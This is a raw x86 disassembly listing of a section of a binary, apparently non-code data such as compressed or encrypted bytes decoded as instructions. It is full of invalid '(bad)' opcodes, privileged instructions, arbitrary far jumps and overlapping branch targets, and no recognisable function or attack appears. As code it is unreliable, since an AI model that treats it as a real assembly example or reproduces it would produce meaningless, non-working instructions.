  4121a1:	imul   esi,DWORD PTR [ebp-0x55],0x6fd74e74
  4121a8:	cs jmp 0x3cc2628e
  4121ae:	inc    esp
  4121af:	pop    edx
  4121b0:	push   ebp
  4121b1:	mov    ebp,0xe35a79d9
  4121b6:	pop    ss
  4121b7:	js     0x4121e7
  4121b9:	aad    0x7d
  4121bb:	jns    0x41222e
  4121bd:	fwait
  4121be:	and    DWORD PTR fs:[esp+ebx*4],0xe2cf5dc5
  4121c6:	mov    ebp,0x3f9e0978
  4121cb:	loope  0x4121ce
  4121cd:	popa   
  4121ce:	test   al,al
  4121d0:	or     eax,0x71befdde
  4121d5:	aam    0xdc
  4121d7:	dec    esi
  4121d8:	enter  0xc460,0xc1
  4121dc:	sbb    ebp,ebx
  4121de:	cwde   
  4121df:	aam    0x1d
  4121e1:	cmp    edi,DWORD PTR [eax-0x75]
  4121e4:	(bad)  
  4121e5:	loopne 0x41219d
  4121e7:	dec    DWORD PTR [edi+ebx*1]
  4121ea:	fidivr DWORD PTR [eax-0x57]
  4121ed:	sar    DWORD PTR [ebx-0x3074deb2],1
  4121f3:	adc    cl,BYTE PTR [ebx]
  4121f5:	addr16 inc esi
  4121f7:	sub    esi,edx
  4121f9:	dec    esp
  4121fa:	and    eax,0x78b28d94
  4121ff:	cmc    
  412200:	inc    ebx
  412201:	pop    esp
  412202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412203:	and    eax,esi
  412205:	xchg   ebx,eax
  412206:	jo     0x41227a
  412208:	mov    al,0xba
  41220a:	xchg   esp,eax
  41220b:	fcmovnb st,st(7)
  41220d:	xchg   edx,eax
  41220e:	repz inc ebp
  412210:	jg     0x4121c7
  412212:	jmp    0x4121e0
  412214:	out    dx,al
  412215:	and    DWORD PTR [ebx+ebx*2],eax
  412218:	arpl   WORD PTR [eax-0x190bc042],si
  41221e:	dec    ebp
  41221f:	lds    ebx,FWORD PTR [esi-0x38]
  412222:	mov    eax,ds:0x7b8c7207
  412227:	mov    eax,0xdc47d324
  41222c:	add    al,0x69
  41222e:	cmps   BYTE PTR es:[si],BYTE PTR es:[di]
  412231:	sub    bl,BYTE PTR [edx+0x63]
  412234:	or     esp,DWORD PTR [eax-0x3f]
  412237:	inc    DWORD PTR [eax-0x62]
  41223a:	pop    ebx
  41223b:	stc    
  41223c:	mov    eax,ds:0x7d8b1ac1
  412241:	sub    ecx,ebp
  412243:	push   ds
  412244:	fstp   TBYTE PTR [eax-0x57]
  412247:	mov    eax,ds:0x2508a2c9
  41224c:	and    al,0x14
  41224e:	ret    
  41224f:	add    al,0x49
  412251:	(bad)
  412254:	out    dx,eax
  412255:	fcmovnbe st,st(0)
  412257:	fmul   st(6),st
  412259:	xchg   DWORD PTR [esi-0x48c832f4],esp
  41225f:	xchg   ebx,eax
  412260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412261:	jmp    0x4122c3
  412263:	leave  
  412264:	outs   dx,BYTE PTR ds:[esi]
  412265:	mov    ah,0x59
  412267:	pop    ecx
  412268:	scas   eax,DWORD PTR es:[edi]
  412269:	or     al,0xb
  41226b:	xor    eax,0xc3842fa0
  412270:	dec    ebx
  412271:	jmp    0xeba8cc8
  412276:	leave  
  412277:	push   cs
  412278:	jmp    0x80ff:0xe8588128
  41227f:	add    BYTE PTR [edi+0x23ea71b2],dl
  412285:	repz (bad) 
  412287:	(bad)  [edx+ebp*1-0x35]
  41228b:	sets   al
  41228e:	push   es
  41228f:	sbb    al,0x8c
  412291:	push   eax
  412292:	or     al,0xd9
  412294:	stos   BYTE PTR es:[di],al
  412296:	jp     0x4122bc
  412298:	jo     0x41223f
  41229a:	arpl   WORD PTR [ecx+0x159682a0],di
  4122a0:	inc    ecx
  4122a1:	cmp    al,0x88
  4122a3:	lock jp 0x4122cc
  4122a6:	(bad)  
  4122a7:	nop
  4122a8:	jb     0x412234
  4122aa:	mov    bh,0xdd
  4122ac:	dec    edx
  4122ad:	icebp  
  4122ae:	inc    esp
  4122af:	adc    BYTE PTR [edx],ch
  4122b1:	mov    ds:0xc26712d6,eax
  4122b6:	jmp    0x412286
  4122b8:	(bad)  
  4122b9:	pushf  
  4122ba:	sub    ebp,ecx
  4122bc:	jge    0x4122a5
  4122be:	mov    al,0x79
  4122c0:	adc    al,0xc6
  4122c2:	jecxz  0x41233e
  4122c4:	and    eax,0x9e636604
  4122c9:	dec    edi
  4122ca:	cmp    BYTE PTR [ebp+0x10b4cd83],dl
  4122d0:	and    edi,DWORD PTR [esi]
  4122d2:	pop    ds
  4122d3:	jecxz  0x412305
  4122d5:	in     al,0x11
  4122d7:	cmp    eax,0x83f47d3e
  4122dc:	out    dx,eax
  4122dd:	mov    ch,0x74
  4122df:	pop    esp
  4122e0:	js     0x412275
  4122e2:	out    dx,eax
  4122e3:	sub    edx,DWORD PTR [eax+0x3003982]
  4122e9:	inc    edi
  4122ea:	ret    0x132d
  4122ed:	adc    BYTE PTR [ebx],al
  4122ef:	cli    
  4122f0:	or     al,0x8a
  4122f2:	test   BYTE PTR [edx+0x7d2b8546],dl
  4122f8:	adc    DWORD PTR [ecx],esp
  4122fa:	adc    al,ah
  4122fc:	cmc    
  4122fd:	repz je 0x4122de
  412300:	add    al,0xc6
  412302:	(bad)  [edx+eiz*2+0x52]
  412306:	cs inc ecx
  412308:	stos   DWORD PTR es:[edi],eax
  412309:	and    eax,ecx
  41230b:	dec    DWORD PTR [esi+0x7a49b1e7]
  412311:	sub    DWORD PTR [edi+ebx*8],edx
  412314:	ret    0x7a03
  412317:	mov    ch,0x92
  412319:	jns    0x412381
  41231b:	sub    eax,0xa7fc5efb
  412320:	add    al,BYTE PTR [edx+0x7e5e73cb]
  412326:	mov    cl,0x8e
  412328:	mov    dl,BYTE PTR [ebx]
  41232a:	xchg   edx,eax
  41232b:	stos   BYTE PTR es:[edi],al
  41232c:	cmp    eax,0xa88e507b
  412331:	pop    es
  412332:	sar    DWORD PTR [eax-0x341f054],0xe9
  412339:	push   0x2a272c70
  41233e:	jle    0x4122c3
  412340:	test   DWORD PTR [ebx],esp
  412342:	dec    esp
  412343:	xchg   ebx,eax
  412344:	sub    al,BYTE PTR [ecx-0x5c043a29]
  41234a:	dec    edi
  41234b:	mul    BYTE PTR [ebx-0x6eae077e]
  412351:	cmp    eax,0x36459644
  412356:	and    DWORD PTR [ecx-0x7b69b46e],eax
  41235c:	xor    DWORD PTR [ebx-0x2e],esi
  41235f:	sbb    ch,dl
  412361:	mov    ch,0x89
  412363:	adc    DWORD PTR [ebx+edx*4],ecx
  412366:	push   ebx
  412367:	lods   al,BYTE PTR ds:[esi]
  412368:	push   eax
  412369:	jb     0x41237a
  41236b:	sbb    DWORD PTR [edx],edi
  41236d:	aas    
  41236e:	neg    DWORD PTR [esi]
  412370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412371:	div    DWORD PTR [eax]
  412373:	popa   
  412374:	mov    esi,0x8240306b
  412379:	call   0xe510:0x67ad7218
  412380:	jmp    0x8738:0xbe5969b8
  412387:	jge    0x4123f8
  412389:	sbb    edx,DWORD PTR ds:0xba18bfc3
  41238f:	pop    esi
  412390:	mov    ecx,0x7ad8ce46
  412395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412396:	in     eax,0x49
  412398:	imul   edx,esi,0xcbd5db65
  41239e:	lods   al,BYTE PTR ds:[esi]
  41239f:	pop    eax
  4123a0:	pop    edi
  4123a1:	sbb    al,0xc
  4123a3:	rcl    DWORD PTR [ebp+0x2c],0x2
  4123a7:	inc    ebx
  4123a8:	dec    eax
  4123a9:	scas   eax,DWORD PTR es:[edi]
  4123aa:	cmp    edx,eax
  4123ac:	push   ecx
  4123ad:	fst    DWORD PTR [edi-0x35]
  4123b0:	(bad)
  4123b3:	and    al,0x7b
  4123b5:	add    eax,0x9871ce49
  4123ba:	or     eax,0x4215200c
  4123bf:	jle    0x412403
  4123c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123c2:	push   ss
  4123c3:	jb     0x4123fc
  4123c5:	inc    edx
  4123c6:	lods   al,BYTE PTR ds:[esi]
  4123c7:	adc    ecx,edx
  4123c9:	lds    ebp,FWORD PTR [ebx-0x45d190a0]
  4123cf:	sbb    BYTE PTR [ecx-0x672fa886],dl
  4123d5:	fld    st(1)
  4123d7:	mov    WORD PTR [edx],?
  4123d9:	cmp    al,0x30
  4123db:	dec    esi
  4123dc:	push   cs
  4123dd:	stos   BYTE PTR es:[edi],al
  4123de:	push   eax
  4123df:	mov    ah,0x1f
  4123e1:	inc    eax
  4123e2:	push   eax
  4123e3:	cmc    
  4123e4:	sub    esi,DWORD PTR ds:[edx+0x7fb20fc9]
  4123eb:	lea    ecx,fs:[esi+0x15]
  4123ef:	aas    
  4123f0:	cwde   
  4123f1:	xor    edx,DWORD PTR [eax]
  4123f3:	cmp    al,0xeb
  4123f5:	inc    esi
  4123f6:	call   0x7798a2b4
  4123fb:	sub    eax,0x45552590
  412400:	aam    0xa7
  412402:	add    DWORD PTR [esi+0x3cbabb97],ebx
  412408:	hlt    
  412409:	pop    edx
  41240a:	xor    dl,BYTE PTR [ecx+0x147a977d]
  412410:	loope  0x4123af
  412412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412413:	(bad)  
  412415:	or     eax,eax
  412417:	popf   
  412418:	test   al,al
  41241a:	int3   
  41241b:	lahf   
  41241c:	adc    eax,0x51c49863
  412421:	ds xchg ebx,eax
  412423:	jbe    0x4123d5
  412425:	aam    0x93
  412427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412428:	push   ebx
  412429:	or     DWORD PTR [ecx-0x2b04e08e],esi
  41242f:	loope  0x412446
  412431:	adc    edx,DWORD PTR [esp+edi*4-0x72]
  412435:	cmp    al,0xfa
  412437:	mov    edx,0x600d43a3
  41243c:	push   esi
  41243d:	pop    edx
  41243e:	aaa    
  41243f:	(bad)  
  412440:	xlat   BYTE PTR ds:[ebx]
  412441:	pop    ss
  412442:	sub    BYTE PTR [edx+eiz*1],ah
  412445:	add    ecx,ecx
  412447:	retf   0xf7da
  41244a:	cs jge 0x412476
  41244d:	xlat   BYTE PTR ds:[ebx]
  41244e:	icebp  
  41244f:	xor    al,BYTE PTR [eax+0x10]
  412452:	test   al,0x55
  412454:	pop    esi
  412455:	xchg   edi,eax
  412456:	xchg   edi,eax
  412457:	test   BYTE PTR [ebp-0x29147218],ch
  41245d:	das    
  41245e:	pop    es
  41245f:	out    0x5d,al
  412461:	repz xchg esi,eax
  412463:	sar    eax,0xd3
  412466:	push   0xffffffcc
  412468:	les    esi,FWORD PTR [edx]
  41246a:	dec    esp
  41246b:	out    0xe8,eax
  41246d:	(bad)  
  41246e:	(bad)  
  412470:	push   ebx
  412471:	mov    edi,0x994c2be
  412476:	jnp    0x4124d5
  412478:	stos   BYTE PTR es:[edi],al
  412479:	jmp    0x5bb47124
  41247e:	push   0xcad36225
  412483:	xor    DWORD PTR [ebx-0x73],ecx
  412486:	fdiv   st(6),st
  412488:	imul   ebp,DWORD PTR [ebx],0x1362ad7c
  41248e:	outs   dx,DWORD PTR ds:[esi]
  41248f:	ret    
  412490:	in     eax,dx
  412491:	call   0x6c4c:0x484c753f
  412498:	in     al,0xa7
  41249a:	and    esp,ebx
  41249c:	sar    DWORD PTR [ebx+0x1b],1
  41249f:	jl     0x4124d2
  4124a1:	mov    ch,0x24
  4124a3:	xchg   ah,ah
  4124a5:	dec    DWORD PTR [eax+0x72]
  4124a8:	inc    esp
  4124a9:	sub    bl,BYTE PTR [edi-0x45]
  4124ac:	dec    esp
  4124ad:	mov    ah,0x6b
  4124af:	fiadd  WORD PTR [eax]
  4124b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124b2:	xchg   esp,eax
  4124b3:	and    bh,al
  4124b5:	cmp    eax,0xce709fbc
  4124ba:	fiadd  DWORD PTR [esi-0x15]
  4124bd:	adc    edi,DWORD PTR [edi+0x75096f36]
  4124c3:	mov    ch,BYTE PTR [ebp-0x6b]
  4124c6:	adc    BYTE PTR [ebp-0x62],dh
  4124c9:	jge    0x41252d
  4124cb:	add    BYTE PTR [ebx-0x5d],0x35
  4124cf:	fild   DWORD PTR [edx-0x2d562d42]
  4124d5:	mov    BYTE PTR [ecx-0x56],bh
  4124d8:	fist   WORD PTR [ebx]
  4124da:	push   0x78
  4124dc:	out    0x1b,eax
  4124de:	and    DWORD PTR ds:[ebx+0xaee123e],0xfffffff7
  4124e6:	les    ebx,FWORD PTR [edx-0x49434ed7]
  4124ec:	mov    eax,0x1ded1c01
  4124f1:	or     al,0xbb
  4124f3:	aad    0x22
  4124f5:	shl    edx,0x1
  4124f8:	push   ebp
  4124f9:	pop    esp
  4124fa:	pop    ebx
  4124fb:	cs push edx
  4124fd:	sti    
  4124fe:	retf   0x6ffc
  412501:	mov    ch,0xd4
  412503:	sar    edx,1
  412505:	sti    
  412506:	adc    bh,cl
  412508:	ret    0xe122
  41250b:	test   BYTE PTR [eax+0x2ed07b36],0xa9
  412512:	lods   al,BYTE PTR ds:[esi]
  412514:	mov    ebx,0x274ef587
  412519:	or     BYTE PTR [esi],dl
  41251b:	imul   ebx,DWORD PTR [ebx],0x36dfbdc5
  412521:	sti    
  412522:	outs   dx,DWORD PTR ds:[esi]
  412523:	es inc ebp
  412525:	sbb    eax,0x7885c61f
  41252a:	cmp    cl,BYTE PTR [edx+0x62]
  41252d:	dec    ebx
  41252e:	mov    esp,ds
  412530:	pop    edx
  412531:	jmp    0xfe41:0xcbfe2902
  412538:	push   ebx
  412539:	fdivr  DWORD PTR [edi+0x73]
  41253c:	mov    edi,0x399b99ac
  412541:	ins    BYTE PTR es:[edi],dx
  412542:	and    al,BYTE PTR [ecx-0x2c]
  412545:	cli    
  412546:	push   ss
  412547:	rcl    DWORD PTR [edi],cl
  412549:	(bad)  
  41254a:	std    
  41254b:	adc    al,0x72
  41254d:	lahf   
  41254e:	fsubr  QWORD PTR [edx+0x40]
  412551:	repz test esp,esi
  412554:	jbe    0x41259f
  412556:	loop   0x412588
  412558:	xchg   ebp,eax
  412559:	jle    0x4124f3
  41255b:	mov    al,ds:0xf902e484
  412560:	out    0x14,al
  412562:	dec    esi
  412563:	ror    DWORD PTR [esi-0x5c6b8ae],0x72
  41256a:	mov    WORD PTR [ecx],es
  41256c:	xor    BYTE PTR [edi-0x64e16047],dl
  412572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412573:	mov    ds:0xd12f8be,al
  412578:	icebp  
  412579:	(bad)
  41257d:	cmp    DWORD PTR [edi+esi*4+0x573c884c],ebx
  412584:	dec    ebx
  412585:	push   esp
  412586:	fwait
  412587:	adc    al,0x62
  412589:	das    
  41258a:	rcr    DWORD PTR [edi+0x11bba2cc],cl
  412590:	pop    edi
  412591:	test   DWORD PTR [ebx+0x5c],edx
  412594:	jne    0x41251d
  412596:	hlt    
  412597:	fisubr WORD PTR ss:[eax-0x3a90c597]
  41259e:	or     al,0xbc
  4125a0:	bound  ebp,QWORD PTR [eax-0x380ea512]
  4125a6:	int    0x86
  4125a8:	adc    esp,eax
  4125aa:	cmp    al,0x43
  4125ac:	dec    esi
  4125ad:	int    0xaa
  4125af:	jmp    0x4125f2
  4125b1:	gs test al,0x63
  4125b4:	js     0x412587
  4125b6:	hlt    
  4125b7:	and    ecx,edi
  4125b9:	pop    es
  4125ba:	mov    al,0xa4
  4125bc:	shl    DWORD PTR [ecx+ecx*8+0x36091ef7],cl
  4125c3:	ins    DWORD PTR es:[edi],dx
  4125c4:	arpl   dx,bp
  4125c6:	mov    ds:0xac49d977,eax
  4125cb:	int3   
  4125cc:	test   DWORD PTR [esi-0x2bdd7ee0],ebp
  4125d2:	mov    al,0x3d
  4125d4:	adc    al,0x81
  4125d6:	in     eax,0x32
  4125d8:	xor    DWORD PTR [eax+0x4a5362fb],ebx
  4125de:	jae    0x41261f
  4125e0:	jnp    0x412589
  4125e2:	xchg   BYTE PTR [ebx+0x57],dh
  4125e5:	imul   esp,edi,0xfc9aff7b
  4125eb:	dec    ecx
  4125ec:	clc    
  4125ed:	adc    ebp,DWORD PTR [esp+edx*4-0x78]
  4125f1:	scas   eax,DWORD PTR es:[edi]
  4125f2:	push   es
  4125f3:	cmp    DWORD PTR [edi-0x50],eax
  4125f6:	fimul  WORD PTR [esi-0x52]
  4125f9:	retf   
  4125fa:	push   ecx
  4125fb:	sub    dh,ch
  4125fd:	pop    eax
  4125fe:	gs retf 0x1534
  412602:	leave  
  412603:	popa   
  412604:	fs jecxz 0x412617
  412607:	add    DWORD PTR [ebx-0x5b7fe732],esp
  41260d:	scas   eax,DWORD PTR es:[edi]
  41260e:	scas   al,BYTE PTR es:[edi]
  41260f:	pop    es
  412610:	hlt    
  412611:	adc    al,0x96
  412613:	sbb    DWORD PTR [edi],ebx
  412615:	adc    BYTE PTR ss:[ebp+0x2e],ch
  412619:	dec    esi
  41261a:	or     ebp,esi
  41261c:	jb     0x412644
  41261e:	or     esi,esp
  412620:	push   cs
  412621:	cld    
  412622:	sbb    BYTE PTR [ebx],bl
  412624:	mov    esi,0xe4e63c31
  412629:	loope  0x4125e9
  41262b:	pusha  
  41262c:	popa   
  41262d:	imul   eax,DWORD PTR [edi-0x148e4785],0xc647ab2c
  412637:	adc    al,0x11
  412639:	adc    ebx,ebp
  41263b:	stos   DWORD PTR es:[edi],eax
  41263c:	or     al,bh
  41263e:	ret    0xa8b6
  412641:	mov    edx,0x73a29601
  412646:	sub    BYTE PTR [edi-0x8],ch
  412649:	pop    es
  41264a:	jb     0x412679
  41264c:	lods   eax,DWORD PTR ds:[esi]
  41264d:	or     DWORD PTR [ebx],ebp
  41264f:	xchg   edi,eax
  412650:	or     DWORD PTR fs:[edx+0x6d],esp
  412654:	retf   
  412655:	dec    ebp
  412656:	add    al,0x74
  412658:	mov    ah,0x53
  41265a:	inc    esp
  41265b:	out    0xc0,eax
  41265d:	jp     0x41265b
  41265f:	idiv   BYTE PTR [esi+0x3b260dcf]
  412665:	stos   DWORD PTR es:[edi],eax
  412666:	stos   DWORD PTR es:[edi],eax
  412667:	dec    ebp
  412668:	leave  
  412669:	mov    BYTE PTR [esp+eax*2+0x16],dl
  41266d:	cld    
  41266e:	fdiv   DWORD PTR [ebx+0x25926d36]
  412674:	mov    esp,0x4f274bb8
  412679:	and    ebp,DWORD PTR [ecx+0x47703060]
  41267f:	jbe    0x412676
  412681:	xor    eax,0xe8d769ee
  412686:	push   ds
  412687:	punpcklwd mm1,DWORD PTR [ecx-0x782c0a81]
  41268e:	jmp    0x3b09b2b7
  412693:	(bad)  
  412694:	xlat   BYTE PTR ds:[ebx]
  412695:	inc    ebx
  412696:	inc    esp
  412697:	cdq    
  412698:	cmp    esi,ebp
  41269a:	xchg   esp,eax
  41269b:	dec    edi
  41269c:	iret   
  41269d:	clc    
  41269e:	cmc    
  41269f:	aaa    
  4126a0:	pop    ecx
  4126a1:	ret    0xaa70
  4126a4:	in     al,dx
  4126a5:	cmp    DWORD PTR [edx],ebx
  4126a7:	rep ins BYTE PTR es:[edi],dx
  4126a9:	retf   
  4126aa:	stos   DWORD PTR es:[edi],eax
  4126ab:	jnp    0x412692
  4126ad:	icebp  
  4126ae:	ret    
  4126af:	push   ss
  4126b0:	nop
  4126b1:	loope  0x412654
  4126b3:	icebp  
  4126b4:	push   0x5343ba2a
  4126b9:	or     eax,0xc71994bf
  4126be:	cs mov ch,bl
  4126c1:	std    
  4126c2:	xlat   BYTE PTR ds:[ebx]
  4126c3:	mov    eax,0xaaf97e01
  4126c8:	dec    eax
  4126c9:	cwde   
  4126ca:	cli    
  4126cb:	xor    edx,DWORD PTR [eax+0x4f]
  4126ce:	das    
  4126cf:	mov    WORD PTR [edx+eiz*2+0x2c75faf6],fs
  4126d6:	stos   DWORD PTR es:[edi],eax
  4126d7:	xor    esi,DWORD PTR [ebx]
  4126d9:	push   edi
  4126da:	sahf   
  4126db:	pop    ebx
  4126dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126dd:	push   esp
  4126de:	loop   0x41275d
  4126e0:	jns    0x4126a5
  4126e2:	imul   ebp,DWORD PTR [ecx],0xffffff9f
  4126e5:	fld    QWORD PTR [ebx-0x43d4f72d]
  4126eb:	pop    esp
  4126ec:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4126ee:	inc    ebx
  4126ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126f0:	sahf   
  4126f1:	cld    
  4126f2:	div    DWORD PTR [eax-0x39ce29a7]
  4126f8:	scas   eax,DWORD PTR es:[edi]
  4126f9:	(bad)  
  4126fa:	aas    
  4126fb:	int3   
  4126fc:	or     BYTE PTR [edx],dl
  4126fe:	out    dx,al
  4126ff:	pop    es
  412700:	push   edi
  412701:	fstp   TBYTE PTR [eax]
  412703:	or     DWORD PTR [eax],0x81fee8cd
  412709:	test   DWORD PTR [esi+ebx*1],0x6f2321ac
  412710:	fcomi  st,st(5)
  412712:	dec    ecx
  412713:	mov    DWORD PTR [eax-0xad0d7a8],ebp
  412719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41271a:	push   0xaf378208
  41271f:	jl     0x412775
  412721:	hlt    
  412722:	mov    ebp,0xd4b84f43
  412727:	mov    ecx,0x4fe29d94
  41272c:	inc    DWORD PTR [edx]
  41272e:	fwait
  41272f:	int    0xd8
  412731:	jbe    0x412726
  412733:	lods   al,BYTE PTR ds:[esi]
  412734:	out    0xf0,eax
  412736:	dec    ebx
  412737:	stc    
  412738:	fwait
  412739:	mov    edx,0x9ec85405
  41273e:	fwait
  41273f:	push   edx
  412740:	jl     0x412789
  412742:	ins    BYTE PTR es:[edi],dx
  412743:	ins    BYTE PTR es:[edi],dx
  412744:	(bad)  
  412745:	mov    dh,0x2f
  412747:	inc    ebp
  412748:	xchg   esp,eax
  412749:	pop    edi
  41274a:	jl     0x4126d1
  41274c:	repz pop edi
  41274e:	es inc ebx
  412750:	mov    ecx,DWORD PTR [edi+0x65]
  412753:	test   eax,0x4db54594
  412758:	xor    ch,dl
  41275a:	and    eax,0xfcee46e4
  41275f:	retf   
  412760:	retf   
  412761:	jb     0x41277b
  412763:	sbb    eax,DWORD PTR [eax+0x67]
  412766:	dec    eax
  412767:	out    dx,eax
  412768:	das    
  412769:	(bad)  
  41276b:	and    DWORD PTR [eax-0x3],0xc5c86ef1
  412772:	and    eax,0xda9ffce1
  412777:	cli    
  412778:	mov    esp,ebx
  41277a:	js     0x412771
  41277c:	in     eax,dx
  41277d:	loopne 0x412725
  41277f:	dec    edx
  412780:	dec    esp
  412781:	cmp    BYTE PTR [ecx+ebp*4],bh
  412784:	pop    es
  412785:	hlt    
  412786:	ret    0x8a09
  412789:	mov    ecx,0x92d79f24
  41278e:	xchg   esp,eax
  41278f:	stos   DWORD PTR es:[di],eax
  412791:	mov    edx,0x669a28d2
  412796:	test   BYTE PTR [eax-0x5],dl
  412799:	sub    al,0x3e
  41279b:	mov    ah,0x9a
  41279d:	ror    DWORD PTR [ebp+0xf],1
  4127a0:	inc    esi
  4127a1:	sbb    al,0xc5
  4127a3:	ds in  al,0xf9
  4127a6:	ja     0x412755
  4127a8:	cwde   
  4127a9:	mov    cl,dh
  4127ab:	jle    0x41276e
  4127ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127ae:	adc    cl,BYTE PTR [esi]
  4127b0:	cmp    eax,0xf084501b
  4127b5:	ins    BYTE PTR es:[edi],dx
  4127b6:	sbb    DWORD PTR [edx-0x3b],esp
  4127b9:	pop    ss
  4127ba:	xchg   BYTE PTR ds:0x7b406c7,cl
  4127c0:	mov    ch,0x31
  4127c2:	ret    
  4127c3:	lods   al,BYTE PTR ds:[esi]
  4127c4:	emms   
  4127c6:	add    esi,DWORD PTR [ebp-0x18]
  4127c9:	xor    BYTE PTR [esi],cl
  4127cb:	not    BYTE PTR [ebx-0x5c4b6adb]
  4127d1:	inc    esi
  4127d2:	pop    ecx
  4127d3:	or     eax,0xe3d1491
  4127d8:	push   ecx
  4127d9:	mov    ch,0x78
  4127db:	imul   edx,esi,0x6135a564
  4127e1:	inc    ebx
  4127e2:	idiv   DWORD PTR [ebp-0xbdf95b0]
  4127e8:	(bad)
  4127eb:	cmc    
  4127ec:	dec    esi
  4127ed:	pop    ecx
  4127ee:	jno    0x412798
  4127f0:	sbb    dl,al
  4127f2:	loope  0x4127c7
  4127f4:	outs   dx,DWORD PTR ds:[esi]
  4127f5:	mov    esi,0xa5dd6a4a
  4127fa:	jle    0x41280f
  4127fc:	adc    al,0xd
  4127fe:	or     ch,cl
  412800:	cdq    
  412801:	pusha  
  412802:	adc    eax,0xe6ecce05
  412807:	xor    al,0xf1
  412809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41280a:	sahf   
  41280b:	xchg   esp,eax
  41280c:	ins    BYTE PTR es:[edi],dx
  41280d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41280e:	stc    
  41280f:	cmp    DWORD PTR [eax+ecx*4],edi
  412812:	pop    es
  412813:	dec    ecx
  412814:	cmp    esi,DWORD PTR [edx+edx*4+0x1b24711a]
  41281b:	out    dx,eax
  41281c:	enter  0xac28,0xab
  412820:	lea    edx,[ebp+0x78]
  412823:	iret   
  412824:	rcr    DWORD PTR [ebx+eax*2-0x42a09e93],1
  41282b:	fs mov cl,0x0
  41282e:	push   eax
  41282f:	jg     0x4128ac
  412831:	or     DWORD PTR [eax+0xe11233a],0x3b8e76dc
  41283b:	fadd   DWORD PTR [esi]
  41283d:	pop    ebp
  41283e:	or     cl,BYTE PTR [ebx+0x30]
  412841:	cmp    al,0xea
  412843:	fdivr  QWORD PTR [edx-0x21a337a3]
  412849:	mov    esi,0x8e17effe
  41284e:	icebp  
  41284f:	pop    ebp
  412850:	dec    ebx
  412851:	mov    ah,0xee
  412853:	mov    ch,0xc7
  412855:	ret    
  412856:	ja     0x4128d3
  412858:	adc    DWORD PTR [ebp-0x366e70cd],ebx
  41285e:	daa    
  41285f:	xchg   edx,eax
  412860:	scas   eax,DWORD PTR es:[edi]
  412861:	lods   eax,DWORD PTR ds:[esi]
  412862:	and    BYTE PTR [eax+0x779df0e9],dl
  412868:	inc    ebp
  412869:	sub    eax,0xe3b202e3
  41286e:	cmc    
  41286f:	pushf  
  412870:	and    BYTE PTR [ebp-0x69],al
  412873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412874:	xor    al,0x4e
  412876:	xchg   ecx,eax
  412877:	mov    bh,0x88
  412879:	mov    ecx,0xaef9009
  41287e:	mov    ebp,eax
  412880:	adc    al,0xdc
  412882:	shl    BYTE PTR [edx+edi*8],1
  412885:	or     al,0xd5
  412887:	das    
  412888:	inc    ecx
  412889:	mov    edi,0xa951658e
  41288e:	aaa    
  41288f:	sbb    esp,DWORD PTR [ecx]
  412891:	push   esi
  412892:	pop    ss
  412893:	ins    DWORD PTR es:[edi],dx
  412894:	xchg   DWORD PTR [esi],esi
  412896:	retf   
  412897:	cmp    eax,0x5ba952f3
  41289c:	sbb    edi,DWORD PTR [ecx+ebp*1-0x246319cb]
  4128a3:	lahf   
  4128a4:	retf   
  4128a5:	xor    ah,BYTE PTR [ebx]
  4128a7:	rcr    BYTE PTR [edx],1
  4128a9:	and    al,0x61
  4128ab:	cs inc ebp
  4128ad:	retf   
  4128ae:	daa    
  4128af:	mov    ds:0xb3e12d51,al
  4128b4:	je     0x41288a
  4128b6:	ins    BYTE PTR es:[edi],dx
  4128b7:	aaa    
  4128b8:	or     ah,BYTE PTR [esi]
  4128ba:	mov    edx,0x143b31cf
  4128bf:	out    dx,eax
  4128c0:	pop    ds
  4128c1:	test   BYTE PTR [esi-0x3e040e11],ch
  4128c7:	mov    edi,0x1ed7b6c
  4128cc:	xor    DWORD PTR [ebx+edx*1-0x6420bd6e],ebx
  4128d3:	rol    DWORD PTR [ebx+0x16f14cb9],cl
  4128d9:	fiadd  WORD PTR [esp+ebx*4-0x4b]
  4128dd:	aad    0x72
  4128df:	dec    esp
  4128e0:	stc    
  4128e1:	repz push esi
  4128e3:	inc    esi
  4128e4:	clc    
  4128e5:	enter  0x975f,0x9
  4128e9:	jno    0x4128f2
  4128eb:	clc    
  4128ec:	cs push ebx
  4128ee:	sbb    cl,BYTE PTR [ebp+ebx*8+0x78]
  4128f2:	in     al,dx
  4128f3:	imul   ebp,DWORD PTR [ebx+0x5b],0x12
  4128f7:	sti    
  4128f8:	jne    0x4128f8
  4128fa:	or     BYTE PTR [ebp-0x61],al
  4128fd:	xchg   esi,eax
  4128fe:	aas    
  4128ff:	mov    bh,BYTE PTR [edx]
  412901:	inc    esp
  412902:	ins    BYTE PTR es:[edi],dx
  412903:	jbe    0x4128f7
  412905:	add    BYTE PTR [ebp-0x3d],bl
  412908:	xchg   DWORD PTR [edx-0x57ced277],edx
  41290e:	leave  
  41290f:	jae    0x4128c3
  412911:	pop    es
  412912:	xchg   ebx,eax
  412913:	popf   
  412914:	cld    
  412915:	push   esp
  412916:	test   eax,ecx
  412918:	push   0xffffffac
  41291a:	jbe    0x41299a
  41291c:	mov    ds:0xaa1cca64,eax
  412921:	jnp    0x4128f0
  412923:	mov    ebx,0x6d7b92a
  412928:	fst    DWORD PTR [edx+0x7ac3263e]
  41292e:	or     dh,ah
  412930:	test   BYTE PTR [edx+ecx*1+0x22],ah
  412934:	dec    ecx
  412935:	mov    eax,ds:0xbfac70b7
  41293a:	push   edi
  41293b:	pop    esi
  41293c:	dec    ecx
  41293d:	int3   
  41293e:	das    
  41293f:	inc    ebx
  412940:	fwait
  412941:	into   
  412942:	pop    edx
